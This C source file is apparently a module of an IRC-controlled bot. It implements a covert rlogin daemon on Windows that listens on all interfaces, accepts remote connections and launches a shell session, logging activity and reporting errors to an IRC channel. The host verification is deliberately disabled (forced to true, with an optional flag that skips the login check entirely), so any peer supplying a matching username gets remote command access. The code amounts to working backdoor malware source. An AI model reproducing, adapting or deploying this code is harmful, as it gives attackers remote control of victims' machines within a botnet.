#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_RLOGIND

BOOL DebugFlag = FALSE;
BOOL InsecureFlag = FALSE;
BOOL LogFlag = FALSE;

static BOOL GetStr(SOCKET Socket, char *buffer, int cnt)
{
	char c;

	do {
		if (frecv(Socket, &c, 1, 0) != 1)
			return (FALSE);
		*buffer++ = c;
		if (--cnt == 0) {
			addlogv("[ rlogind ]:  Protocol string too long.");
			return (FALSE);
		}
	} while (c != 0);

	return (TRUE);
}

static BOOL CtrlHandler(DWORD CtrlType)
{
	return (CtrlType == CTRL_C_EVENT);
}

static BOOL CheckLogin(char *RemoteUser, char *RemoteHost, char *LocalUser, unsigned long ClientAddr)
{
	// LPHOSTENT HostEnt;
	// BYTE HostName[100];
	BOOL HostOk = FALSE;

	if (strcmp(LocalUser, RemoteUser) != 0) {
		addlogv("[ rlogind ]:  Login rejected, Remote user: <%s@%s>.", RemoteUser, RemoteHost);
		return (FALSE);
	}

	// FIX ME: need to add in a real hostcheck.
	/*
	if ((HostEnt = gethostbyname(HostName)) != NULL)
		if (ClientAddr == *(unsigned long *)HostEnt->h_addr) {
			HostOk = TRUE;
			break;
		}
	}
	*/

	HostOk=TRUE;
	if (!HostOk)
		addlogv("[ rlogind ]:  Login rejected, Remote user: <%s@%s>.", RemoteUser, RemoteHost);

	return HostOk;
}

DWORD WINAPI RlogindClientThread(LPVOID param)
{
	RLOGIND rlogind = *((RLOGIND *)param);
	RLOGIND *rloginds = (RLOGIND *)param;
	rloginds->gotinfo = TRUE;

	int threadnum=rlogind.cthreadnum;

	char LocalUser[16], RemoteUser[16], TerminalType[64], HostName[100], Buffer[16];
	LPHOSTENT HostEnt;
	SOCKADDR_IN csin;

	TIMEVAL timeout;
	timeout.tv_sec = 30;
	timeout.tv_usec = 0;
	fd_set fd;
	FD_ZERO(&fd);
	FD_SET(threads[threadnum].sock, &fd);

	if (fselect(0, &fd, NULL, NULL, &timeout) == 0) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}

	frecv(threads[threadnum].sock, (char *)&Buffer, 1, 0);

	GetStr(threads[threadnum].sock, RemoteUser, sizeof(RemoteUser));
	GetStr(threads[threadnum].sock, LocalUser, sizeof(LocalUser));
	GetStr(threads[threadnum].sock, TerminalType, sizeof(TerminalType));

	int csin_len = sizeof(csin);
	if (fgetpeername(threads[threadnum].sock, (LPSOCKADDR) &csin, &csin_len) != 0) {
		addlogv("[ rlogind ]:  Error: getpeername(): <%d>.", fWSAGetLastError());
		clearthread(threadnum);
		ExitThread(0);
	}

	if ((HostEnt = fgethostbyaddr((char *)&csin.sin_addr, sizeof(csin.sin_addr), PF_INET)) == NULL)
		sprintf(HostName, finet_ntoa(csin.sin_addr));
	else
		strcpy(HostName, HostEnt->h_name);

	fsend(threads[threadnum].sock, "", 1, 0);

	if (!InsecureFlag && !CheckLogin(RemoteUser,HostName,rlogind.username,csin.sin_addr.s_addr)) {
		fsend(threads[threadnum].sock, PERMISSION_DENIED_MSG, sizeof PERMISSION_DENIED_MSG, 0);
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}

	addlogv("[ rlogind ]:  User logged in: <%s@%s>.", RemoteUser, HostName);

	if (! SessionRun(threadnum)) {
		addlogv("[ rlogind ]:  Error: SessionRun(): <%d>.", GetLastError());
		clearthread(threadnum);
		ExitThread(1);
	}

	addlogv("[ rlogind ]:  User logged out: <%s@%s>.", RemoteUser, HostName);

	clearthread(threadnum);
	ExitThread(0);
}

DWORD WINAPI RlogindThread(LPVOID param)
{
	RLOGIND rlogind = *((RLOGIND *)param);
	RLOGIND *rloginds = (RLOGIND *)param;
	rloginds->gotinfo = TRUE;

	char sendbuf[IRCLINE];

    int csin_len, Err;
	unsigned long mode = 1;

	WSADATA WSAData;
    SECURITY_ATTRIBUTES SecurityAttributes;
    DWORD id;

	if ((Err = fWSAStartup(MAKEWORD(2,2), &WSAData)) != 0) {
		addlogv("[ rlogind ]:  Error: WSAStartup(): <%d>.", Err);
		clearthread(rlogind.threadnum);
		ExitThread(1);
	}
	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)&CtrlHandler, TRUE)) {
		addlogv("[ rlogind ]:  Failed to install control-C handler, error: <%d>.", GetLastError());
		fWSACleanup();
		clearthread(rlogind.threadnum);
		ExitThread(1);
	}

	SOCKET ssock, csock;
    SOCKADDR_IN csin, ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)rlogind.port);
	ssin.sin_addr.s_addr = INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		threads[rlogind.threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) == 0) {
			if (flisten(ssock, SOMAXCONN) == 0) {
				SecurityAttributes.nLength = sizeof(SecurityAttributes);
				SecurityAttributes.lpSecurityDescriptor = NULL;
				SecurityAttributes.bInheritHandle = FALSE;

				addlog("[ rlogind ]:  Ready and waiting for incoming connections.");

				BOOL flag = TRUE;
				while (1) {
					csin_len = sizeof(csin);
					if ((csock = faccept(ssock, (LPSOCKADDR)&csin, &csin_len)) == INVALID_SOCKET)
						break;

					if (fsetsockopt(csock, SOL_SOCKET, SO_KEEPALIVE,(char *)&flag,flag) != SOCKET_ERROR) {
						rlogind.gotinfo = FALSE;
						sprintf(sendbuf,"[ rlogind ]:  Client connection from IP: %s:%d, Server thread: %d.", finet_ntoa(csin.sin_addr), csin.sin_port, rlogind.threadnum);
						addlog(sendbuf);
						rlogind.cthreadnum = addthread(sendbuf,RLOGIN_THREAD,csock);
						threads[rlogind.cthreadnum].parent = rlogind.threadnum;
						if (threads[rlogind.cthreadnum].tHandle = CreateThread(&SecurityAttributes,0,&RlogindClientThread,(LPVOID)&rlogind,0,&id)) {
							while (rlogind.gotinfo == FALSE)
								Sleep(50);
						} else {
							addlogv("[ rlogind ]:  Failed to start client thread, error: <%d>.", GetLastError());
							break;
						}
					}
				}
			}
		}
	}

	sprintf(sendbuf, "[ rlogind ]:  Error: server failed, returned: <%d>.", fWSAGetLastError());
	if (!rlogind.silent) irc_privmsg(rlogind.sock, rlogind.chan, sendbuf, rlogind.notice);
	addlog(sendbuf);

	fclosesocket(csock);
	fclosesocket(ssock);
	fWSACleanup();

	clearthread(rlogind.threadnum);

	ExitThread(0);
}
#endif